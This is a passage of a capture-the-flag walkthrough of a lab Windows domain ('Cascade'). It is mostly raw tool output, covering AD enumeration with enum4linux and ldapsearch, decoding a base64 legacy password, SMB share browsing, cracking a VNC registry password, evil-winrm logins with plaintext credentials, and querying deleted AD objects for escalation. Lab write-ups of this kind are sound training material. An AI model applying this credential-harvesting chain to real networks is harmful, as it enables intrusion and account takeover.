uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.  [+] Getting builtin groups: group:[Pre-Windows 2000 Compatible Access] rid:[0x22a] group:[Incoming Forest Trust Builders] rid:[0x22d] group:[Windows Authorization Access Group] rid:[0x230] group:[Terminal Server License Servers] rid:[0x231] group:[Users] rid:[0x221] group:[Guests] rid:[0x222] group:[Remote Desktop Users] rid:[0x22b] group:[Network Configuration Operators] rid:[0x22c] group:[Performance Monitor Users] rid:[0x22e] group:[Performance Log Users] rid:[0x22f] group:[Distributed COM Users] rid:[0x232] group:[IIS_IUSRS] rid:[0x238] group:[Cryptographic Operators] rid:[0x239] group:[Event Log Readers] rid:[0x23d] group:[Certificate Service DCOM Access] rid:[0x23e]  [+] Getting builtin group memberships: Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Group 'Pre-Windows 2000 Compatible Access' (RID: 554) has member: NT AUTHORITY\\Authenticated Users Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Group 'Guests' (RID: 546) has member: CASCADE\\CascGuest Group 'Guests' (RID: 546) has member: CASCADE\\Domain Guests Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Group 'Users' (RID: 545) has member: NT AUTHORITY\\INTERACTIVE Group 'Users' (RID: 545) has member: NT AUTHORITY\\Authenticated Users Group 'Users' (RID: 545) has member: CASCADE\\Domain Users Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Group 'Windows Authorization Access Group' (RID: 560) has member: NT AUTHORITY\\ENTERPRISE DOMAIN CONTROLLERS Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.  [+] Getting local groups: group:[Cert Publishers] rid:[0x205] group:[RAS and IAS Servers] rid:[0x229] group:[Allowed RODC Password Replication Group] rid:[0x23b] group:[Denied RODC Password Replication Group] rid:[0x23c] group:[DnsAdmins] rid:[0x44e] group:[IT] rid:[0x459] group:[Production] rid:[0x45a] group:[HR] rid:[0x45b] group:[AD Recycle Bin] rid:[0x45f] group:[Backup] rid:[0x460] group:[Temps] rid:[0x463] group:[WinRMRemoteWMIUsers__] rid:[0x465] group:[Remote Management Users] rid:[0x466] group:[Factory] rid:[0x46c] group:[Finance] rid:[0x46d] group:[Audit Share] rid:[0x471] group:[Data Share] rid:[0x472]  [+] Getting local group memberships: Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Group 'HR' (RID: 1115) has member: CASCADE\\s.hickson Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\\krbtgt Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\\Domain Controllers Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\\Schema Admins Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\\Enterprise Admins Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\\Cert Publishers Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\\Domain Admins Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\\Group Policy Creator Owners Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\\Read-only Domain Controllers Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Group 'IT' (RID: 1113) has member: CASCADE\\arksvc Group 'IT' (RID: 1113) has member: CASCADE\\s.smith Group 'IT' (RID: 1113) has member: CASCADE\\r.thompson Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Group 'Data Share' (RID: 1138) has member: CASCADE\\Domain Users Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Group 'Audit Share' (RID: 1137) has member: CASCADE\\s.smith Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Group 'Remote Management Users' (RID: 1126) has member: CASCADE\\arksvc Group 'Remote Management Users' (RID: 1126) has member: CASCADE\\s.smith Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Group 'AD Recycle Bin' (RID: 1119) has member: CASCADE\\arksvc Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 593.  [+] Getting domain groups: group:[Enterprise Read-only Domain Controllers] rid:[0x1f2] group:[Domain Users] rid:[0x201] group:[Domain Guests] rid:[0x202] group:[Domain Computers] rid:[0x203] group:[Group Policy Creator Owners] rid:[0x208] group:[DnsUpdateProxy] rid:[0x44f]  [+] Getting domain group memberships: Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614. Group 'Domain Users' (RID: 513) has member: CASCADE\\administrator Group 'Domain Users' (RID: 513) has member: CASCADE\\krbtgt Group 'Domain Users' (RID: 513) has member: CASCADE\\arksvc Group 'Domain Users' (RID: 513) has member: CASCADE\\s.smith Group 'Domain Users' (RID: 513) has member: CASCADE\\r.thompson Group 'Domain Users' (RID: 513) has member: CASCADE\\util Group 'Domain Users' (RID: 513) has member: CASCADE\\j.wakefield Group 'Domain Users' (RID: 513) has member: CASCADE\\s.hickson Group 'Domain Users' (RID: 513) has member: CASCADE\\j.goodhand Group 'Domain Users' (RID: 513) has member: CASCADE\\a.turnbull Group 'Domain Users' (RID: 513) has member: CASCADE\\e.crowe Group 'Domain Users' (RID: 513) has member: CASCADE\\b.hanson Group 'Domain Users' (RID: 513) has member: CASCADE\\d.burman Group 'Domain Users' (RID: 513) has member: CASCADE\\BackupSvc Group 'Domain Users' (RID: 513) has member: CASCADE\\j.allen Group 'Domain Users' (RID: 513) has member: CASCADE\\i.croft Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614. Group 'Domain Guests' (RID: 514) has member: CASCADE\\CascGuest Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614. Group 'Group Policy Creator Owners' (RID: 520) has member: CASCADE\\administrator Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.   Using Ldap Search—   Intresting findings from ldapsearch   dn: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local objectClass: top objectClass: person objectClass: organizationalPerson objectClass: user cn: Ryan Thompson sn: Thompson givenName: Ryan distinguishedName: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local instanceType: 4 whenCreated: 20200109193126.0Z whenChanged: 20200323112031.0Z displayName: Ryan Thompson uSNCreated: 24610 memberOf: CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local uSNChanged: 295010 name: Ryan Thompson objectGUID:: LfpD6qngUkupEy9bFXBBjA== userAccountControl: 66048 badPwdCount: 8 codePage: 0 countryCode: 0 badPasswordTime: 132299219591809760 lastLogoff: 0 lastLogon: 132299203623153712 pwdLastSet: 132230718862636251 primaryGroupID: 513 objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFVQQAAA== accountExpires: 9223372036854775807 logonCount: 2 sAMAccountName: r.thompson sAMAccountType: 805306368 userPrincipalName: r.thompson@cascade.local objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local dSCorePropagationData: 20200126183918.0Z dSCorePropagationData: 20200119174753.0Z dSCorePropagationData: 20200119174719.0Z dSCorePropagationData: 20200119174508.0Z dSCorePropagationData: 16010101000000.0Z lastLogonTimestamp: 132294360317419816 msDS-SupportedEncryptionTypes: 0  This seems more intresting..   cascadeLegacyPwd: clk0bjVldmE=   Decoding with the base64   echo \"clk0bjVldmE=\" | base64 -d   rY4n5eva   Using smbclient for further more enumeration!   smbclient -L cascade.htb -U r.thompson Enter WORKGROUP\\r.thompson's password:           Sharename       Type      Comment         ---------       ----      -------         ADMIN$          Disk      Remote Admin         Audit$          Disk               C$              Disk      Default share         Data            Disk               IPC$            IPC       Remote IPC         NETLOGON        Disk      Logon server share          print$          Disk      Printer Drivers         SYSVOL          Disk      Logon server share  SMB1 disabled -- no workgroup available  Some more intresting findings!   smbclient //cascade.htb/Data -U r.thompson Enter WORKGROUP\\r.thompson's password:  Try \"help\" to get a list of possible commands. smb: \\&gt; ls   .                                   D        0  Sun Jan 26 22:27:34 2020   ..                                  D        0  Sun Jan 26 22:27:34 2020   Contractors                         D        0  Sun Jan 12 20:45:11 2020   Finance                             D        0  Sun Jan 12 20:45:06 2020   IT                                  D        0  Tue Jan 28 13:04:51 2020   Production                          D        0  Sun Jan 12 20:45:18 2020   Temps                               D        0  Sun Jan 12 20:45:15 2020                  13106687 blocks of size 4096. 7806882 blocks available smb: \\&gt; cd It smb: \\It\\&gt; ls   .                                   D        0  Tue Jan 28 13:04:51 2020   ..                                  D        0  Tue Jan 28 13:04:51 2020   Email Archives                      D        0  Tue Jan 28 13:00:30 2020   LogonAudit                          D        0  Tue Jan 28 13:04:40 2020   Logs                                D        0  Tue Jan 28 19:53:04 2020   Temp                                D        0  Tue Jan 28 17:06:59 2020                  13106687 blocks of size 4096. 7806882 blocks available    After moving into the dir Email Archives……….   smb: \\IT\\Email Archives\\&gt; ls   .                                   D        0  Tue Jan 28 13:04:51 2020   ..                                  D        0  Tue Jan 28 13:04:51 2020   Meeting_Notes_June_2018.html        A     2522  Tue Jan 28 13:04:51 2020  \t\t13106687 blocks of size 4096. 7793283 blocks available   smb: \\IT\\Email Archives\\&gt; get Meeting_Notes_June_2018.html                                                                                                                                                                                  getting file \\IT\\Email Archives\\Meeting_Notes_June_2018.html of size 2522 as Meeting_Notes_June_2018.html (3.3 KiloBytes/sec) (average 3.3 KiloBytes/sec)     cat Meeting_Notes_June_2018.html    &lt;p&gt;-- New production network will be going live on                                                                                                                                                                                          Wednesday so keep an eye out for any issues. &lt;/p&gt;                                                                                                                                                                                                                                                                                                                                                                                                                                       &lt;p&gt;-- We will be using a temporary account to                                                                                                                                                                                               perform all tasks related to the network migration and this account will be deleted at the end of                                                                                                                                           2018 once the migration is complete. This will allow us to identify actions                                                                                                                                                                 related to the migration in security logs etc. Username is TempAdmin (password is the same as the normal admin account password). &lt;/p&gt;                                                                                                                                                                                                                                                                                                                                                  &lt;p&gt;-- The winner of the �Best GPO� competition will be                                                                                                                                                                                      announced on Friday so get your submissions in soon.&lt;/p&gt;                    So from here I moved into the Temp folder and found a user S.Smith.   smb: \\IT\\Temp\\s.smith\\&gt; ls   .                                   D        0  Wed Jan 29 05:00:01 2020   ..                                  D        0  Wed Jan 29 05:00:01 2020   VNC Install.reg                     A     2680  Wed Jan 29 04:27:44 2020                  13106687 blocks of size 4096. 7793278 blocks available   Here there is a registery found VNC Install.reg. let’s see what’s inside that.   cat VNC Install.reg  ��Windows Registry Editor Version 5.00  [HKEY_LOCAL_MACHINE\\SOFTWARE\\TightVNC]  [HKEY_LOCAL_MACHINE\\SOFTWARE\\TightVNC\\Server] \"ExtraPorts\"=\"\" \"QueryTimeout\"=dword:0000001e \"QueryAcceptOnTimeout\"=dword:00000000 \"LocalInputPriorityTimeout\"=dword:00000003 \"LocalInputPriority\"=dword:00000000 \"BlockRemoteInput\"=dword:00000000 \"BlockLocalInput\"=dword:00000000 \"IpAccessControl\"=\"\" \"RfbPort\"=dword:0000170c \"HttpPort\"=dword:000016a8 \"DisconnectAction\"=dword:00000000 \"AcceptRfbConnections\"=dword:00000001 \"UseVncAuthentication\"=dword:00000001 \"UseControlAuthentication\"=dword:00000000 \"RepeatControlAuthentication\"=dword:00000000 \"LoopbackOnly\"=dword:00000000 \"AcceptHttpConnections\"=dword:00000001 \"LogLevel\"=dword:00000000 \"EnableFileTransfers\"=dword:00000001 \"RemoveWallpaper\"=dword:00000001 \"UseD3D\"=dword:00000001 \"UseMirrorDriver\"=dword:00000001 \"EnableUrlParams\"=dword:00000001 \"Password\"=hex:6b,cf,2a,4b,6e,5a,ca,0f \"AlwaysShared\"=dword:00000000 \"NeverShared\"=dword:00000000 \"DisconnectClients\"=dword:00000001 \"PollingInterval\"=dword:000003e8 \"AllowLoopback\"=dword:00000000 \"VideoRecognitionInterval\"=dword:00000bb8 \"GrabTransparentWindows\"=dword:00000001 \"SaveLogToAllUsersPath\"=dword:00000000 \"RunControlInterface\"=dword:00000001 \"IdleTimeout\"=dword:00000000 \"VideoClasses\"=\"\" \"VideoRects\"=\"\"     \"Password\"=hex:6b,cf,2a,4b,6e,5a,ca,0f   after cracking the hex we  get the password as sT333ve2     Login as S.Smith   evil-winrm -i cascade.htb -u s.smith -p sT333ve2  Evil-WinRM shell v2.0  Info: Establishing connection to remote endpoint  *Evil-WinRM* PS C:\\Users\\s.smith\\Documents&gt;    Getting User.txt   *Evil-WinRM* PS C:\\Users\\s.smith\\Documents&gt; cd .. *Evil-WinRM* PS C:\\Users\\s.smith&gt; cd Desktop *Evil-WinRM* PS C:\\Users\\s.smith\\Desktop&gt; type user.txt 36e**************************9e513 *Evil-WinRM* PS C:\\Users\\s.smith\\Desktop&gt;    Privilege Escalaition Part 1:   Evil-WinRM* PS C:\\Users\\s.smith\\Desktop&gt; whoami /all  USER INFORMATION ----------------  User Name       SID =============== ============================================== cascade\\s.smith S-1-5-21-3332504370-1206983947-1165150453-1107   GROUP INFORMATION -----------------  Group Name                                  Type             SID                                            Attributes =========================================== ================ ============================================== =============================================================== Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group BUILTIN\\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group BUILTIN\\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group CASCADE\\Data Share                          Alias            S-1-5-21-3332504370-1206983947-1165150453-1138 Mandatory group, Enabled by default, Enabled group, Local Group CASCADE\\Audit Share                         Alias            S-1-5-21-3332504370-1206983947-1165150453-1137 Mandatory group, Enabled by default, Enabled group, Local Group CASCADE\\IT                                  Alias            S-1-5-21-3332504370-1206983947-1165150453-1113 Mandatory group, Enabled by default, Enabled group, Local Group CASCADE\\Remote Management Users             Alias            S-1-5-21-3332504370-1206983947-1165150453-1126 Mandatory group, Enabled by default, Enabled group, Local Group NT AUTHORITY\\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group Mandatory Label\\Medium Plus Mandatory Level Label            S-1-16-8448   PRIVILEGES INFORMATION ----------------------  Privilege Name                Description                    State ============================= ============================== ======= SeMachineAccountPrivilege     Add workstations to domain     Enabled SeChangeNotifyPrivilege       Bypass traverse checking       Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled  Nothing much in this..   Proceding with Dir enumeration.   *Evil-WinRM* PS C:\\&gt; cd Shares *Evil-WinRM* PS C:\\Shares&gt; cd Audit *Evil-WinRM* PS C:\\Shares\\Audit&gt; ls     Directory: C:\\Shares\\Audit Mode                LastWriteTime         Length Name                                                            ----                -------------         ------ ----                      d-----        1/28/2020   9:40 PM                DB                                                                                                                                                                                                       d-----        1/26/2020  10:25 PM                x64                                                                                                                                                                                                      d-----        1/26/2020  10:25 PM                x86                                                                                                                                                                                                      -a----        1/28/2020   9:46 PM          13312 CascAudit.exe                                                                                                                                                                                            -a----        1/29/2020   6:00 PM          12288 CascCrypto.dll                                                                                                                                                                                           -a----        1/28/2020  11:29 PM             45 RunAudit.bat                                                                                                                                                                                             -a----       10/27/2019   6:38 AM         363520 System.Data.SQLite.dll                                                                                                                                                                                   -a----       10/27/2019   6:38 AM         186880 System.Data.SQLite.EF6.dll     -a----        1/28/2020   9:46 PM          13312 CascAudit.exe                                                                                                                                                                                            -a----        1/29/2020   6:00 PM          12288 CascCrypto.dll     Found a couple of intresting files exe and dll.   There was a folder DB and which contains Audit.db..   *Evil-WinRM* PS C:\\Shares\\Audit\\DB&gt; ls       Directory: C:\\Shares\\Audit\\DB   Mode                LastWriteTime         Length Name                                                                                                                                                                                                     ----                -------------         ------ ----                                                                                                                                                                                                     -a----        1/28/2020   9:39 PM          24576 Audit.db   Downloaded the Audit.db file and looking in the contents I found ArkSvcBQO5l5Kj9MdErXx6Q6AGOw==   Having a look at both the other files that we have got CascAudit.exe and CascCrypto.dll using DNSPY.            After all the REverse Engineering is done, the final output is the password of user ARK-SVC   Login as Arksvc   evil-winrm -i cascade.htb -u arksvc -p w3lc0meFr31nd  Evil-WinRM shell v2.0  Info: Establishing connection to remote endpoint  *Evil-WinRM* PS C:\\Users\\arksvc\\Documents&gt;   Privilege escalation part 2   *Evil-WinRM* PS C:\\Users\\arksvc\\Documents&gt; whoami /all  USER INFORMATION ----------------  User Name      SID                                            ============== ============================================== cascade\\arksvc S-1-5-21-3332504370-1206983947-1165150453-1106   GROUP INFORMATION -----------------  Group Name                                  Type             SID                                            Attributes                                                      =========================================== ================ ============================================== =============================================================== Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group              BUILTIN\\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group              BUILTIN\\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group              NT AUTHORITY\\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group              NT AUTHORITY\\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group              NT AUTHORITY\\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group              CASCADE\\Data Share                          Alias            S-1-5-21-3332504370-1206983947-1165150453-1138 Mandatory group, Enabled by default, Enabled group, Local Group CASCADE\\IT                                  Alias            S-1-5-21-3332504370-1206983947-1165150453-1113 Mandatory group, Enabled by default, Enabled group, Local Group CASCADE\\AD Recycle Bin                      Alias            S-1-5-21-3332504370-1206983947-1165150453-1119 Mandatory group, Enabled by default, Enabled group, Local Group CASCADE\\Remote Management Users             Alias            S-1-5-21-3332504370-1206983947-1165150453-1126 Mandatory group, Enabled by default, Enabled group, Local Group NT AUTHORITY\\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group              Mandatory Label\\Medium Plus Mandatory Level Label            S-1-16-8448                                                                                                      PRIVILEGES INFORMATION ----------------------  Privilege Name                Description                    State   ============================= ============================== ======= SeMachineAccountPrivilege     Add workstations to domain     Enabled SeChangeNotifyPrivilege       Bypass traverse checking       Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled  This thing seems very instresting!!   CASCADE\\AD Recycle Bin                      Alias            S-1-5-21-3332504370-1206983947-1165150453-1119 Mandatory group, Enabled by default, Enabled group, Local Group   Finding the Deleted Objects:   *Evil-WinRM* PS C:\\Users\\arksvc\\Documents&gt; Get-ADObject -ldapFilter:\"(msDS-LastKnownRDN=*)\" -IncludeDeletedObjects    Deleted           : True DistinguishedName : CN=CASC-WS1\\0ADEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe,CN=Deleted Objects,DC=cascade,DC=local Name              : CASC-WS1                     DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe ObjectClass       : computer ObjectGUID        : 6d97daa4-2e82-4946-a11e-f91fa18bfabe  Deleted           : True DistinguishedName : CN=Scheduled Tasks\\0ADEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2,CN=Deleted Objects,DC=cascade,DC=local Name              : Scheduled Tasks                     DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2 ObjectClass       : group ObjectGUID        : 13375728-5ddb-4137-b8b8-b9041d1d3fd2  Deleted           : True DistinguishedName : CN={A403B701-A528-4685-A816-FDEE32BDDCBA}\\0ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN=Deleted Objects,DC=cascade,DC=local Name              : {A403B701-A528-4685-A816-FDEE32BDDCBA}                     DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e ObjectClass       : groupPolicyContainer ObjectGUID        : ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e  Deleted           : True DistinguishedName : CN=Machine\\0ADEL:93c23674-e411-400b-bb9f-c0340bda5a34,CN=Deleted Objects,DC=cascade,DC=local Name              : Machine                     DEL:93c23674-e411-400b-bb9f-c0340bda5a34 ObjectClass       : container ObjectGUID        : 93c23674-e411-400b-bb9f-c0340bda5a34  Deleted           : True DistinguishedName : CN=User\\0ADEL:746385f2-e3a0-4252-b83a-5a206da0ed88,CN=Deleted Objects,DC=cascade,DC=local Name              : User                     DEL:746385f2-e3a0-4252-b83a-5a206da0ed88 ObjectClass       : container ObjectGUID        : 746385f2-e3a0-4252-b83a-5a206da0ed88  Deleted           : True DistinguishedName : CN=TempAdmin\\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local Name              : TempAdmin                     DEL:f0cc344d-31e0-4866-bceb-a842791ca059 ObjectClass       : user ObjectGUID        : f0cc344d-31e0-4866-bceb-a842791ca059    The below ones are intresting!   Deleted           : True DistinguishedName : CN=TempAdmin\\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local Name              : TempAdmin                     DEL:f0cc344d-31e0-4866-bceb-a842791ca059 ObjectClass       : user ObjectGUID        : f0cc344d-31e0-4866-bceb-a842791ca059  Gaining ROOT Access!!   *Evil-WinRM* PS C:\\Users\\arksvc\\Documents&gt; Get-ADObject -filter 'isdeleted -eq $true -and name -ne \"Deleted Objects\"' -includeDeletedObjects -property *   accountExpires                  : 9223372036854775807 badPasswordTime                 : 0 badPwdCount                     : 0 CanonicalName                   : cascade.local/Deleted Objects/CASC-WS1                                   DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe CN                              : CASC-WS1                                   DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe codePage                        : 0 countryCode                     : 0 Created                         : 1/9/2020 7:30:19 PM createTimeStamp                 : 1/9/2020 7:30:19 PM Deleted                         : True Description                     : DisplayName                     : DistinguishedName               : CN=CASC-WS1\\0ADEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe,CN=Deleted Objects,DC=cascade,DC=local dSCorePropagationData           : {1/17/2020 3:37:36 AM, 1/17/2020 12:14:04 AM, 1/9/2020 7:30:19 PM, 1/1/1601 12:04:17 AM} instanceType                    : 4 isCriticalSystemObject          : False isDeleted                       : True LastKnownParent                 : OU=Computers,OU=UK,DC=cascade,DC=local lastLogoff                      : 0 lastLogon                       : 0 localPolicyFlags                : 0 logonCount                      : 0 Modified                        : 1/28/2020 6:08:35 PM modifyTimeStamp                 : 1/28/2020 6:08:35 PM msDS-LastKnownRDN               : CASC-WS1 Name                            : CASC-WS1                                   DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity ObjectCategory                  : ObjectClass                     : computer ObjectGUID                      : 6d97daa4-2e82-4946-a11e-f91fa18bfabe objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1108 primaryGroupID                  : 515 ProtectedFromAccidentalDeletion : False pwdLastSet                      : 132230718192147073 sAMAccountName                  : CASC-WS1$ sDRightsEffective               : 0 userAccountControl              : 4128 uSNChanged                      : 245849 uSNCreated                      : 24603 whenChanged                     : 1/28/2020 6:08:35 PM whenCreated                     : 1/9/2020 7:30:19 PM  CanonicalName                   : cascade.local/Deleted Objects/Scheduled Tasks                                   DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2 CN                              : Scheduled Tasks                                   DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2 Created                         : 1/13/2020 5:21:53 PM createTimeStamp                 : 1/13/2020 5:21:53 PM Deleted                         : True Description                     : DisplayName                     : DistinguishedName               : CN=Scheduled Tasks\\0ADEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2,CN=Deleted Objects,DC=cascade,DC=local dSCorePropagationData           : {1/17/2020 9:35:46 PM, 1/17/2020 9:32:57 PM, 1/17/2020 3:37:36 AM, 1/17/2020 12:14:04 AM...} groupType                       : -2147483644 instanceType                    : 4 isDeleted                       : True LastKnownParent                 : OU=Groups,OU=UK,DC=cascade,DC=local Modified                        : 1/28/2020 6:07:55 PM modifyTimeStamp                 : 1/28/2020 6:07:55 PM msDS-LastKnownRDN               : Scheduled Tasks Name                            : Scheduled Tasks                                   DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2 nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity ObjectCategory                  : ObjectClass                     : group ObjectGUID                      : 13375728-5ddb-4137-b8b8-b9041d1d3fd2 objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1131 ProtectedFromAccidentalDeletion : False sAMAccountName                  : Scheduled Tasks sDRightsEffective               : 0 uSNChanged                      : 245848 uSNCreated                      : 114790 whenChanged                     : 1/28/2020 6:07:55 PM whenCreated                     : 1/13/2020 5:21:53 PM  CanonicalName                   : cascade.local/Deleted Objects/{A403B701-A528-4685-A816-FDEE32BDDCBA}                                   DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e CN                              : {A403B701-A528-4685-A816-FDEE32BDDCBA}                                   DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e Created                         : 1/26/2020 2:34:30 AM createTimeStamp                 : 1/26/2020 2:34:30 AM Deleted                         : True Description                     : DisplayName                     : Block Potato DistinguishedName               : CN={A403B701-A528-4685-A816-FDEE32BDDCBA}\\0ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN=Deleted Objects,DC=cascade,DC=local dSCorePropagationData           : {1/1/1601 12:00:00 AM} flags                           : 0 gPCFileSysPath                  : \\\\cascade.local\\SysVol\\cascade.local\\Policies\\{A403B701-A528-4685-A816-FDEE32BDDCBA} gPCFunctionalityVersion         : 2 gPCMachineExtensionNames        : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{53D6AB1D-2488-11D1-A28C-00C04FB94F17}][{B1BE8D72-6EAC-11D2-A4EA-00C04F79F83A}{53D6AB1D-2488-11D1-A28C-00C04FB94F17}] instanceType                    : 4 isDeleted                       : True LastKnownParent                 : CN=Policies,CN=System,DC=cascade,DC=local Modified                        : 1/26/2020 2:40:52 AM modifyTimeStamp                 : 1/26/2020 2:40:52 AM msDS-LastKnownRDN               : {A403B701-A528-4685-A816-FDEE32BDDCBA} Name                            : {A403B701-A528-4685-A816-FDEE32BDDCBA}                                   DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity ObjectCategory                  : ObjectClass                     : groupPolicyContainer ObjectGUID                      : ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e ProtectedFromAccidentalDeletion : False sDRightsEffective               : 0 showInAdvancedViewOnly          : True uSNChanged                      : 196701 uSNCreated                      : 196688 versionNumber                   : 2 whenChanged                     : 1/26/2020 2:40:52 AM whenCreated                     : 1/26/2020 2:34:30 AM  CanonicalName                   : cascade.local/Deleted Objects/Machine                                   DEL:93c23674-e411-400b-bb9f-c0340bda5a34 CN                              : Machine                                   DEL:93c23674-e411-400b-bb9f-c0340bda5a34 Created                         : 1/26/2020 2:34:31 AM createTimeStamp                 : 1/26/2020 2:34:31 AM Deleted                         : True Description                     : DisplayName                     : DistinguishedName               : CN=Machine\\0ADEL:93c23674-e411-400b-bb9f-c0340bda5a34,CN=Deleted Objects,DC=cascade,DC=local dSCorePropagationData           : {1/1/1601 12:00:00 AM} instanceType                    : 4 isDeleted                       : True LastKnownParent                 : CN={A403B701-A528-4685-A816-FDEE32BDDCBA}\\0ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN=Deleted Objects,DC=cascade,DC=local Modified                        : 1/26/2020 2:40:52 AM 